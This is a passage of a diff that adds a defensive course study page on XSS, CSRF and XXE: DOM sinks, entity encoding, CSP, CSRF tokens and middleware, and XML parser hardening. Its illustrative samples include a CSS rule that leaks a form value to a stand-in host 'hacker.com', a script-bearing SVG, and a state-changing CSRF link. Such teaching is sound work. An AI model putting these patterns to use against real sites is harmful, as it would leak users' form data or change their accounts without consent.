+    dummy.href = userLink;
+    window.location.href = <span class="s">`https://mywebsite.com/${dummy.href}`</span>;
+    <span class="c">// Browser encodes tags: %3Cscript%3Ealert(...)%3C%2Fscript%3E</span>
+};
+    </div>
+
+    <p>You can also use <code>encodeURIComponent()</code> for encoding individual URI segments. While theoretically escapable, these browser-native functions are vastly better tested than any custom solution.</p>
+</div>
+
+<!-- ════════ DANGEROUS DOM APIS ════════ -->
+<div id="xss-sinks" class="topic">
+    <div class="topic-header">
+        <div class="topic-icon">&#9888;&#65039;</div>
+        <h2>Dangerous DOM API Sinks</h2>
+    </div>
+
+    <p>A <strong>sink</strong> is any API that converts text into executable DOM or script. The following APIs are the most common XSS sinks — avoid them whenever possible, and sanitize rigorously when they must be used:</p>
+
+    <table class="data-table">
+        <thead>
+            <tr>
+                <th>API</th>
+                <th>Risk</th>
+                <th>Safer Alternative</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td><strong>element.innerHTML / outerHTML</strong></td>
+                <td>Interprets HTML tags as DOM — direct XSS sink</td>
+                <td>Use <code>innerText</code> or <code>document.createElement()</code></td>
+            </tr>
+            <tr>
+                <td><strong>DOMParser.parseFromString()</strong></td>
+                <td>Converts a string into a full DOM tree — script tags execute</td>
+                <td>Build DOM nodes manually with <code>createElement()</code> + <code>appendChild()</code></td>
+            </tr>
+            <tr>
+                <td><strong>SVG</strong></td>
+                <td>XML-based format that supports <code>&lt;script&gt;</code> tags and <code>onload</code> handlers</td>
+                <td>Sanitize or reject user-uploaded SVGs; prefer raster formats (PNG, JPG)</td>
+            </tr>
+            <tr>
+                <td><strong>Blob + createObjectURL()</strong></td>
+                <td>Can store arbitrary data including executable scripts, then inject them via <code>script.src</code></td>
+                <td>Avoid Blob when any part of the instantiation involves user data</td>
+            </tr>
+            <tr>
+                <td><strong>document.write() / writeln()</strong></td>
+                <td>Writes raw HTML directly into the document stream</td>
+                <td>Never use in modern applications; build DOM with standard APIs</td>
+            </tr>
+        </tbody>
+    </table>
+
+    <div class="story">
+        <div class="story-label">&#128214; From the Book — SVG Script Execution</div>
+        <p>SVG files are XML-based, which means they support embedded <code>&lt;script&gt;</code> tags. An uploaded SVG file can execute arbitrary JavaScript when loaded into the page — making SVGs significantly more dangerous than raster image formats:</p>
+    </div>
+
+    <div class="code-box">
+<span class="tag">&lt;svg</span> <span class="attr">version</span>=<span class="s">"1.1"</span> <span class="attr">xmlns</span>=<span class="s">"http://www.w3.org/2000/svg"</span><span class="tag">&gt;</span>
+    <span class="tag">&lt;circle</span> <span class="attr">cx</span>=<span class="s">"250"</span> <span class="attr">cy</span>=<span class="s">"250"</span> <span class="attr">r</span>=<span class="s">"50"</span> <span class="attr">fill</span>=<span class="s">"red"</span> <span class="tag">/&gt;</span>
+    <span class="tag">&lt;script</span> <span class="attr">type</span>=<span class="s">"text/javascript"</span><span class="tag">&gt;</span>console.log(<span class="s">'test'</span>);<span class="tag">&lt;/script&gt;</span>
+<span class="tag">&lt;/svg&gt;</span>
+    </div>
+
+    <div class="key-point">
+        <h4>&#128273; The Rule of Thumb</h4>
+        <p>Any API that converts text to DOM or text to script is a potential XSS attack vector. Prefer APIs that give you explicit control over element creation (<code>createElement</code>, <code>appendChild</code>) over APIs that interpret strings as markup.</p>
+    </div>
+</div>
+
+<!-- ════════ HTML ENTITY ENCODING ════════ -->
+<div id="xss-entity" class="topic">
+    <div class="topic-header">
+        <div class="topic-icon">&#128290;</div>
+        <h2>HTML Entity Encoding</h2>
+    </div>
+
+    <p>Entity encoding converts potentially dangerous characters into their HTML entity equivalents. The encoded characters are <strong>displayed correctly</strong> in the browser but <strong>cannot be interpreted as code</strong>.</p>
+
+    <h3>The "Big Five" Characters</h3>
+
+    <table class="data-table">
+        <thead>
+            <tr>
+                <th>Character</th>
+                <th>Entity Encoded</th>
+                <th>Why It Matters</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td><strong>&amp;</strong></td>
+                <td><code>&amp;amp;</code></td>
+                <td>Starts entity sequences — must be escaped to prevent injection of other entities</td>
+            </tr>
+            <tr>
+                <td><strong>&lt;</strong></td>
+                <td><code>&amp;lt;</code></td>
+                <td>Opens HTML tags — the primary character used to start <code>&lt;script&gt;</code> and other dangerous elements</td>
+            </tr>
+            <tr>
+                <td><strong>&gt;</strong></td>
+                <td><code>&amp;gt;</code></td>
+                <td>Closes HTML tags</td>
+            </tr>
+            <tr>
+                <td><strong>"</strong></td>
+                <td><code>&amp;#034;</code></td>
+                <td>Breaks out of attribute values in double-quoted contexts</td>
+            </tr>
+            <tr>
+                <td><strong>'</strong></td>
+                <td><code>&amp;#039;</code></td>
+                <td>Breaks out of attribute values in single-quoted contexts</td>
+            </tr>
+        </tbody>
+    </table>
+
+    <div class="warning">
+        <h4>&#9888;&#65039; Entity Encoding Has Limits</h4>
+        <p>Entity encoding <strong>only protects content injected into HTML body elements</strong> (like <code>&lt;div&gt;</code> or <code>&lt;p&gt;</code>). It does NOT protect content injected inside <code>&lt;script&gt;</code> tags, CSS, or URLs — because valid JavaScript can be constructed from sequences of entity-encoded characters in those contexts.</p>
+    </div>
+</div>
+
+<!-- ════════ CSS AS ATTACK VECTOR ════════ -->
+<div id="xss-css" class="topic">
+    <div class="topic-header">
+        <div class="topic-icon">&#127912;</div>
+        <h2>CSS as an Attack Vector</h2>
+    </div>
+
+    <p>CSS is typically considered a "display-only" technology, but its specification is powerful enough to be used as a data exfiltration channel. If your application allows users to upload custom stylesheets, attackers can use CSS to <strong>leak form data to external servers</strong>.</p>
+
+    <div class="story">
+        <div class="story-label">&#128214; From the Book — CSS Data Exfiltration</div>
+        <p>CSS allows selective styling based on form field values. Combined with <code>background:url()</code>, an attacker can trigger HTTP GET requests that leak form data to a remote server — without any JavaScript at all:</p>
+    </div>
+
+    <div class="code-box">
+<span class="c">/* When the income field is set to ">100k", CSS triggers a GET request */</span>
+<span class="tag">#income</span>[<span class="attr">value</span>=<span class="s">">100k"</span>] {
+    <span class="k">background</span>: <span class="n">url</span>(<span class="s">"https://www.hacker.com/incomes?amount=gte100k"</span>);
+}
+<span class="c">/* The form value is leaked to the attacker's server via the URL */</span>
+    </div>
+
+    <h3>Three Levels of CSS Defense</h3>
+
+    <table class="data-table">
+        <thead>
+            <tr>
+                <th>Difficulty</th>
+                <th>Defense</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td><strong>Easy</strong></td>
+                <td>Disallow user-uploaded CSS entirely — the simplest and most effective solution</td>
+            </tr>
+            <tr>
+                <td><strong>Medium</strong></td>
+                <td>Allow users to modify only specific, safe fields — then generate the stylesheet yourself on the server using those fields</td>
+            </tr>
+            <tr>
+                <td><strong>Hard</strong></td>
+                <td>Sanitize any HTTP-initiating CSS attributes (<code>background:url</code>, <code>@import</code>, etc.) — extremely difficult to do comprehensively</td>
+            </tr>
+        </tbody>
+    </table>
+</div>
+
+<!-- ════════ CSP ════════ -->
+<div id="xss-csp" class="topic">
+    <div class="topic-header">
+        <div class="topic-icon">&#128737;</div>
+        <h2>Content Security Policy (CSP)</h2>
+    </div>
+
+    <p>The Content Security Policy is a <strong>browser-level security configuration</strong> that restricts what code can execute inside your application. CSP is supported by all major browsers and provides a powerful first layer of defense against XSS.</p>
+
+    <h3>Script Source (<code>script-src</code>)</h3>
+    <p>CSP allows you to whitelist specific URLs from which scripts are allowed to load. Any script from an unlisted origin is blocked and the browser throws a CSP violation error.</p>
+
+    <div class="code-box">
+<span class="c">/* CSP header — only allow scripts from your own domain and your API */</span>
+Content-Security-Policy: <span class="k">script-src</span> <span class="s">"self"</span> <span class="s">https://api.mega-bank.com</span>
+
+<span class="c">/* Attempting to load a script from https://www.hacker.com → BLOCKED */</span>
+<span class="c">/* Attempting to load a script from https://api2.mega-bank.com → BLOCKED */</span>
+    </div>
+
+    <div class="warning">
+        <h4>&#9888;&#65039; Avoid Wildcard CSP Whitelists</h4>
+        <p>Whitelisting <code>https://*.mega-bank.com</code> may seem convenient, but if any subdomain later allows user-uploaded content (e.g., <code>hosting.mega-bank.com</code>), an attacker can host malicious scripts on that subdomain and bypass your CSP entirely. Always whitelist specific origins.</p>
+    </div>
+
+    <h3>Unsafe Eval &amp; Unsafe Inline</h3>
+    <p>When CSP is enabled, two dangerous capabilities are <strong>disabled by default</strong>:</p>
+
+    <div class="compare-grid">
+        <div class="compare-card" style="border-top-color: var(--red);">
+            <h4><code>unsafe-inline</code></h4>
+            <p>Allows inline <code>&lt;script&gt;</code> tags and inline event handlers. Disabled by default when CSP is active. Re-enabling it significantly weakens XSS protection.</p>
+        </div>
+        <div class="compare-card" style="border-top-color: var(--red);">
+            <h4><code>unsafe-eval</code></h4>
+            <p>Allows <code>eval()</code> and similar string-to-code functions. Disabled by default when CSP is active. If your code uses <code>eval</code>, rewrite it to avoid string interpretation.</p>
+        </div>
+    </div>
+
+    <div class="story">
+        <div class="story-label">&#128214; From the Book — Rewriting eval-Style Code</div>
+        <p>Code that passes strings to functions like <code>setTimeout</code> can often be rewritten to avoid string interpretation entirely:</p>
+    </div>
+
+    <div class="code-box">
+<span class="c">// ✗ UNSAFE — string is interpreted as code (requires unsafe-eval)</span>
+<span class="k">const</span> <span class="n">startTimer</span> = <span class="k">function</span>(minutes, message) {
+    setTimeout(<span class="s">`window.alert(${message});`</span>, minutes * <span class="n">60</span> * <span class="n">1000</span>);
+};
+
+<span class="c">// ✓ SAFE — function reference, no string interpretation needed</span>
+<span class="k">const</span> <span class="n">startTimer</span> = <span class="k">function</span>(minutes, message) {
+    setTimeout(<span class="k">function</span>() {
+        alert(message);
+    }, minutes * <span class="n">60</span> * <span class="n">1000</span>);
+};
+    </div>
+
+    <h3>How to Implement CSP</h3>
+
+    <ol class="step-list">
+        <li>
+            <div class="step-num">1</div>
+            <div>
+                <strong>HTTP Header (Recommended)</strong><br>
+                Have your server send a <code>Content-Security-Policy</code> header with every response. The header value is the policy string itself.
+            </div>
+        </li>
+        <li>
+            <div class="step-num">2</div>
+            <div>
+                <strong>HTML Meta Tag (Alternative)</strong><br>
+                Embed a <code>&lt;meta http-equiv="Content-Security-Policy" content="..."&gt;</code> tag in your HTML <code>&lt;head&gt;</code>. Less flexible than the header approach but useful when you cannot control server headers.
+            </div>
+        </li>
+    </ol>
+
+    <div class="key-point">
+        <h4>&#128273; CSP Does Not Protect Against DOM XSS</h4>
+        <p>CSP is a strong first measure against reflected and stored XSS, but it does <strong>not</strong> protect against DOM-based XSS — where the vulnerability exists entirely in client-side JavaScript. A comprehensive defense combines CSP with the coding best practices described earlier in this chapter.</p>
+    </div>
+</div>
+
+<div class="section-divider"></div>
+
+<!-- ══════════════════════════════════════════════════════════ -->
+<!--                 CHAPTER 23 — CSRF DEFENSE                -->
+<!-- ══════════════════════════════════════════════════════════ -->
+
+<!-- ════════ HEADER VERIFICATION ════════ -->
+<div id="csrf-headers" class="topic">
+    <div class="topic-header">
+        <div class="topic-icon">&#128274;</div>
+        <h2>Ch.23 — Header Verification</h2>
+    </div>
+
+    <p>Many CSRF attacks originate from a different website than the target. Because of this, we can use HTTP headers to verify the <strong>origin of each request</strong> as a first line of defense.</p>
+
+    <h3>Two Headers to Check</h3>
+
+    <div class="compare-grid">
+        <div class="compare-card" style="border-top-color: var(--ch);">
+            <h4>Origin Header</h4>
+            <p>Sent on HTTP POST requests. Indicates where the request originated. Present on both HTTP and HTTPS. Cannot be modified programmatically by JavaScript in major browsers.</p>
+        </div>
+        <div class="compare-card" style="border-top-color: var(--ch);">
+            <h4>Referer Header</h4>
+            <p>Sent on all requests (unless <code>rel=noreferer</code> is set). Also indicates request origin. Should be checked alongside the Origin header for defense in depth.</p>
+        </div>
+    </div>
+
+    <div class="code-box">
+<span class="k">const</span> validLocations = [
+    <span class="s">'https://www.mega-bank.com'</span>,
+    <span class="s">'https://api.mega-bank.com'</span>,
+    <span class="s">'https://portal.mega-bank.com'</span>
+];
+
+<span class="k">const</span> <span class="n">validateHeadersAgainstCSRF</span> = <span class="k">function</span>(headers) {
+    <span class="k">const</span> origin  = headers.origin;
+    <span class="k">const</span> referer = headers.referer;
+
+    <span class="k">if</span> (!origin || !referer) { <span class="k">return</span> <span class="n">false</span>; }
+
+    <span class="k">if</span> (!validLocations.includes(origin) ||
+        !validLocations.includes(referer)) {
+        <span class="k">return</span> <span class="n">false</span>;
+    }
+    <span class="k">return</span> <span class="n">true</span>;
+};
+    </div>
+
+    <div class="info-box">
+        <h4>&#128161; Header Verification Is a Starting Point</h4>
+        <p>If an attacker achieves XSS on one of your whitelisted origins, they can initiate CSRF attacks that appear to come from your own servers — bypassing header verification entirely. This is why header verification should always be combined with CSRF tokens and other defenses.</p>
+    </div>
+</div>
+
+<!-- ════════ CSRF TOKENS ════════ -->
+<div id="csrf-tokens" class="topic">
+    <div class="topic-header">
+        <div class="topic-icon">&#128273;</div>
+        <h2>CSRF Tokens — The Primary Defense</h2>
+    </div>
+
+    <p>The most powerful and widely used defense against CSRF is the <strong>anti-CSRF token</strong>. Most major websites rely on CSRF tokens as their primary CSRF defense.</p>
+
+    <h3>How CSRF Tokens Work</h3>
+
+    <ol class="step-list">
+        <li>
+            <div class="step-num">1</div>
+            <div>
+                <strong>Server generates a unique token</strong><br>
+                The token is cryptographically generated with a very low collision probability. It is typically generated once per session (though it can be regenerated per request for higher security).
+            </div>
+        </li>
+        <li>
+            <div class="step-num">2</div>
+            <div>
+                <strong>Client sends the token with every request</strong><br>
+                The token is included in both form submissions and AJAX requests. On the server side, the token is verified to ensure it is live (not expired), authentic, and unmodified. If verification fails, the request is logged and rejected.
+            </div>
+        </li>
+        <li>
+            <div class="step-num">3</div>
+            <div>
+                <strong>Attackers cannot forge the token</strong><br>
+                Since each token is unique per session and per user, an attacker on a different origin cannot obtain a valid token. They would need to target a specific user and possess their current, unexpired token — a dramatically harder attack.
+            </div>
+        </li>
+    </ol>
+
+    <h3>Stateless CSRF Tokens</h3>
+    <p>Modern web applications often use stateless (REST) APIs. CSRF tokens can be implemented without server-side session storage by combining three components:</p>
+
+    <ul class="clean-list">
+        <li><strong>User identifier</strong> — uniquely ties the token to its owner</li>
+        <li><strong>Timestamp</strong> — enables token expiration (e.g., 1 week)</li>
+        <li><strong>Cryptographic nonce</strong> — signed with a server-side secret key to prevent forgery</li>
+    </ul>
+
+    <div class="indigo-box">
+        <h4>&#128274; Stateless Tokens Scale Better</h4>
+        <p>Stateless CSRF tokens consume fewer server resources than session-managed tokens because they do not require the server to track active sessions. The server validates the token using its secret key at request time — no database lookup needed.</p>
+    </div>
+</div>
+
+<!-- ════════ STATELESS GET ════════ -->
+<div id="csrf-get" class="topic">
+    <div class="topic-header">
+        <div class="topic-icon">&#128683;</div>
+        <h2>Stateless GET Requests — The Foundational Rule</h2>
+    </div>
+
+    <p>The single most common and easily exploitable CSRF attack vector is an HTTP GET request that modifies server-side state. The fix is an absolute design rule: <strong>HTTP GET requests must never store or modify any server-side state.</strong></p>
+
+    <div class="compare-grid">
+        <div class="compare-card" style="border-top-color: var(--red);">
+            <h4>&#10060; Vulnerable: GET That Modifies State</h4>
+            <p>A single GET endpoint that both retrieves and optionally updates a user. An attacker can craft a link like <code>GET /user?id=123&amp;updates=email:hacker</code> to modify the user's email through a simple link click.</p>
+        </div>
+        <div class="compare-card" style="border-top-color: var(--green);">
+            <h4>&#9989; Safe: Separate GET and POST</h4>
+            <p>Split into a GET endpoint (read only) and a POST endpoint (writes). The GET can never modify state, and the POST is not vulnerable to link-based or image-based CSRF attacks.</p>
+        </div>
+    </div>
+
+    <div class="code-box">
+<span class="c">// ✗ VULNERABLE — GET request modifies state</span>
+<span class="k">const</span> <span class="n">user</span> = <span class="k">function</span>(req, res) {
+    getUserById(req.query.id).then(<span class="k">function</span>(user) {
+        <span class="k">if</span> (req.query.updates) { user.update(req.updates); } <span class="c">// state change in GET!</span>
+        <span class="k">return</span> res.json(user);
+    });
+};
+
+<span class="c">// ✓ SAFE — read and write are separate endpoints</span>
+<span class="k">const</span> <span class="n">getUser</span> = <span class="k">function</span>(req, res) {        <span class="c">// GET — read only</span>
+    getUserById(req.query.id).then(<span class="k">function</span>(user) {
+        <span class="k">return</span> res.json(user);
+    });
+};
+
+<span class="k">const</span> <span class="n">updateUser</span> = <span class="k">function</span>(req, res) {    <span class="c">// POST — writes</span>
+    getUserById(req.query.id).then(<span class="k">function</span>(user) {
+        user.update(req.updates).then(<span class="k">function</span>(updated) {
+            <span class="k">if</span> (!updated) { <span class="k">return</span> res.sendStatus(<span class="n">400</span>); }
+            <span class="k">return</span> res.sendStatus(<span class="n">200</span>);
+        });
+    });
+};
+    </div>
+
+    <div class="key-point">
+        <h4>&#128273; The Nature of the Web Makes GET Dangerous</h4>
+        <p>Links, images, stylesheets, and iframes all trigger HTTP GET requests automatically. This makes GET inherently more exposed to CSRF than POST. By ensuring GET requests are always read-only, you eliminate the entire class of link-based and image-based CSRF attacks.</p>
+    </div>
+</div>
+
+<!-- ════════ ANTI-CSRF MIDDLEWARE ════════ -->
+<div id="csrf-middleware" class="topic">
+    <div class="topic-header">
+        <div class="topic-icon">&#128736;</div>
+        <h2>Application-Wide Anti-CSRF Middleware</h2>
+    </div>
+
+    <p>CSRF defenses are only effective when applied <strong>application-wide</strong>. A single unprotected endpoint breaks the entire chain. Modern web server stacks support <strong>middleware</strong> — code that runs on every request before any route logic executes.</p>
+
+    <div class="code-box">
+<span class="k">const</span> crypto   = require(<span class="s">'../util/crypto'</span>);
+<span class="k">const</span> dateTime = require(<span class="s">'../util/dateTime'</span>);
+<span class="k">const</span> session  = require(<span class="s">'../util/session'</span>);
+<span class="k">const</span> logger   = require(<span class="s">'../util/logger'</span>);
+
+<span class="k">const</span> <span class="n">validateCSRFToken</span> = <span class="k">function</span>(token, user) {
+    <span class="k">const</span> text_token = crypto.decrypt(token);
+    <span class="k">const</span> user_id = text_token.split(<span class="s">':'</span>)[<span class="n">0</span>];
+    <span class="k">const</span> date    = text_token.split(<span class="s">':'</span>)[<span class="n">1</span>];
+    <span class="k">const</span> nonce   = text_token.split(<span class="s">':'</span>)[<span class="n">2</span>];
+
+    <span class="k">let</span> validUser  = (user_id === user.id);
+    <span class="k">let</span> validDate  = dateTime.lessThan(<span class="n">1</span>, <span class="s">'week'</span>, date);
+    <span class="k">let</span> validNonce = crypto.validateNonce(user_id, date, nonce);
+
+    <span class="k">return</span> validUser &amp;&amp; validDate &amp;&amp; validNonce;
+};
+
+<span class="k">const</span> <span class="n">CSRFShield</span> = <span class="k">function</span>(req, res, next) {
+    <span class="k">if</span> (!validateHeaders(req.headers, req.method) ||
+        !validateCSRFToken(req.csrf, session.currentUser)) {
+        logger.log(req);            <span class="c">// log the failed attempt</span>
+        <span class="k">return</span> res.sendStatus(<span class="n">401</span>);  <span class="c">// reject before any logic runs</span>
+    }
+    <span class="k">return</span> next();                  <span class="c">// pass to route handler</span>
+};
+    </div>
+
+    <p>This middleware combines both header verification and CSRF token validation into a single check that runs before any route logic. It rejects invalid requests with a 401 status and logs the attempt for monitoring.</p>
+
+    <div class="indigo-box">
+        <h4>&#128736; Automate on the Client Too</h4>
+        <p>Since the middleware requires a CSRF token on every request, automate token attachment on the client side as well. You can use the <strong>proxy pattern</strong> to override <code>XMLHttpRequest</code> to always include the token, or build a request library wrapper that injects the correct token based on the HTTP method.</p>
+    </div>
+</div>
+
+<div class="section-divider"></div>
+
+<!-- ══════════════════════════════════════════════════════════ -->
+<!--                 CHAPTER 24 — XXE DEFENSE                 -->
+<!-- ══════════════════════════════════════════════════════════ -->
+
+<!-- ════════ DISABLING EXTERNAL ENTITIES ════════ -->
+<div id="xxe-disable" class="topic">
+    <div class="topic-header">
+        <div class="topic-icon">&#128196;</div>
+        <h2>Ch.24 — Disabling External Entities</h2>
+    </div>
+
+    <p>The primary defense against XXE is remarkably simple: <strong>disable external entity processing in your XML parser</strong>. This is typically a single line of configuration.</p>
+
+    <div class="code-box">
+<span class="c">// Java — disable DOCTYPE declarations (which enable external entities)</span>
+factory.setFeature(
+    <span class="s">"http://apache.org/xml/features/disallow-doctype-decl"</span>,
+    <span class="n">true</span>
+);
+    </div>
+
+    <div class="warning">
+        <h4>&#9888;&#65039; Java XML Parsers Are Especially Risky</h4>
+        <p>OWASP specifically warns that many Java-based XML parsers have external entities <strong>enabled by default</strong>. Depending on the language and parser, the default may vary — always check your parser's documentation explicitly. Never assume external entities are disabled.</p>
+    </div>
+
+    <div class="key-point">
+        <h4>&#128273; One Line of Configuration</h4>
+        <p>XXE is one of the easiest vulnerabilities to fix and one of the most dangerous to leave unfixed. Always verify your XML parser configuration before deploying any application that processes XML or XML-derived formats (including SVG).</p>
+    </div>
+</div>
+
+<!-- ════════ XML vs JSON ════════ -->
+<div id="xxe-json" class="topic">
+    <div class="topic-header">
+        <div class="topic-icon">&#128260;</div>
+        <h2>Evaluating Alternative Data Formats — XML vs JSON</h2>
+    </div>
+
+    <p>If your application uses XML only for structured data payloads (not for rendering or schema validation), switching to <strong>JSON eliminates XXE risk entirely</strong>. JSON stores key/value pairs in a string-based format and has no mechanism for referencing external files.</p>
+
+    <table class="data-table">
+        <thead>
+            <tr>
+                <th>Category</th>
+                <th>XML</th>
+                <th>JSON</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td><strong>Payload Size</strong></td>
+                <td>Large</td>
+                <td>Compact</td>
+            </tr>
+            <tr>
+                <td><strong>Specification Complexity</strong></td>
+                <td>High</td>
+                <td>Low</td>
+            </tr>
+            <tr>
+                <td><strong>Ease of Use</strong></td>
+                <td>Requires complex parsing</td>
+                <td>Simple — maps directly to JavaScript objects</td>
+            </tr>
+            <tr>
+                <td><strong>Metadata Support</strong></td>
+                <td>Yes (attributes)</td>
+                <td>No</td>
+            </tr>
+            <tr>
+                <td><strong>Schema Validation</strong></td>
+                <td>Supported (XSD)</td>
+                <td>Not built-in</td>
+            </tr>
+            <tr>
+                <td><strong>Rendering (HTML-like)</strong></td>
+                <td>Easy (XML is DOM-like)</td>
+                <td>Difficult</td>
+            </tr>
+            <tr>
+                <td><strong>Readability</strong></td>
+                <td>Low</td>
+                <td>High</td>
+            </tr>
+            <tr>
+                <td><strong>Security</strong></td>
+                <td>Lower (external entities, DTDs)</td>
+                <td>Higher (no code execution mechanism)</td>
+            </tr>
+        </tbody>
+    </table>
+
+    <h3>When to Use Which</h3>
+
+    <div class="compare-grid">
+        <div class="compare-card" style="border-top-color: var(--green);">
+            <h4>Use JSON When...</h4>
+            <p>Your API sends structured data to be interpreted by JavaScript. JSON is lighter, simpler, and inherently safer. It is the default choice for modern REST APIs.</p>
+        </div>
+        <div class="compare-card" style="border-top-color: var(--ch);">
+            <h4>Keep XML When...</h4>
+            <p>Your application processes actual XML documents, SVG files, or requires strict schema validation with XSD. In these cases, disable external entities and validate rigorously.</p>
+        </div>
+    </div>
+
+    <div class="info-box">
+        <h4>&#128161; Other Alternatives</h4>
+        <p>If JSON is not suitable, YAML, BSON, and EDN are all viable alternatives — but each should undergo a similar security analysis before adoption.</p>
+    </div>
+</div>
+
+<!-- ════════ ADVANCED XXE ════════ -->
+<div id="xxe-advanced" class="topic">
+    <div class="topic-header">
+        <div class="topic-icon">&#9888;&#65039;</div>
+        <h2>Advanced XXE Risks — Escalation</h2>
+    </div>
+
+    <p>XXE attacks often begin as <strong>read-only data access</strong> — the attacker reads files from the server's filesystem via external entity references. However, this initial access frequently serves as a <strong>gateway to more severe attacks</strong>.</p>
+
+    <div class="story">
+        <div class="story-label">&#128214; From the Book — XXE as a Gateway Attack</div>
+        <p>XXE provides the attacker with a recon platform that permits them to access data otherwise inaccessible from outside the web server. Using this data — configuration files, credentials, internal network addresses — other parts of the application may be more easily compromised.</p>
+    </div>
+
+    <h3>XXE Escalation Path</h3>
+
+    <ol class="step-list">
+        <li>
+            <div class="step-num">1</div>
+            <div>
+                <strong>Read-only file access</strong><br>
+                The attacker reads sensitive files — <code>/etc/passwd</code>, application config files, database credentials, API keys.
+            </div>
+        </li>
+        <li>
+            <div class="step-num">2</div>
+            <div>
+                <strong>Internal network scanning</strong><br>
+                Using XXE to make requests to internal IP addresses, the attacker maps the internal network topology and discovers other services.
+            </div>
+        </li>
+        <li>
+            <div class="step-num">3</div>
+            <div>
+                <strong>Remote code execution</strong><br>
+                With stolen credentials and internal network knowledge, the attacker can potentially achieve full server takeover — far beyond the initial "read-only" XXE entry point.
+            </div>
+        </li>
+    </ol>
+
+    <div class="warning">
+        <h4>&#9888;&#65039; Never Underestimate XXE</h4>
+        <p>The final impact of an XXE attack can range from simple data disclosure to <strong>complete remote code execution and full server takeover</strong>. This escalation potential is why XXE is rated as one of the most dangerous web application vulnerabilities — and why it must be addressed even when the immediate impact appears limited to file reads.</p>
+    </div>
+</div>
+
+<div class="section-divider"></div>
+
+<!-- ════════ SUMMARY ════════ -->
+<div id="summary" class="summary-banner">
+    <h3>&#128737; Chapters 22–24 Summary — Defending Against XSS, CSRF &amp; XXE</h3>
+    <ul>
+        <li>XSS defense starts with a core rule: never allow unsanitized user data into the DOM — use <code>innerText</code> over <code>innerHTML</code> and validate that inputs are string-like</li>
+        <li>Dangerous DOM APIs (innerHTML, DOMParser, SVG, Blob, document.write) are the primary XSS sinks — avoid them or sanitize rigorously</li>
+        <li>HTML entity encoding protects content in HTML body elements but NOT in script tags, CSS, or URLs</li>
+        <li>CSS can be used as a data exfiltration channel — disallow user-uploaded stylesheets when possible</li>
+        <li>Content Security Policy (CSP) restricts script sources and disables unsafe-eval/unsafe-inline at the browser level — but does not protect against DOM XSS</li>
+        <li>CSRF defense combines header verification (Origin + Referer), anti-CSRF tokens (stateful or stateless), and stateless GET requests</li>
+        <li>The foundational CSRF rule: HTTP GET requests must never modify server-side state — this eliminates all link-based and image-based CSRF</li>
+        <li>Anti-CSRF middleware should run on every request, application-wide — a single unprotected endpoint breaks the entire defense</li>
+        <li>XXE defense is simple: disable external entities in your XML parser — one line of configuration</li>
+        <li>JSON eliminates XXE risk entirely and should be preferred over XML for API payloads</li>
+        <li>XXE can escalate from read-only file access to remote code execution — never underestimate its severity</li>
+    </ul>
+</div>
+
+</main>
+</div><!-- /main-layout -->
+</div><!-- /container -->
+
+<!-- Footer -->
+<footer class="footer">
+    <div class="footer-inner">
+        <div class="footer-brand">CYB 236 &mdash; Web Application Security</div>
+        <div class="footer-links">
+            <a href="../index.html">Course Home</a>
+            <a href="../week8/index.html">Week 8</a>
+            <a href="../syllabus.html">Syllabus</a>
+        </div>
+    </div>
+</footer>
+
 </body>
 </html>
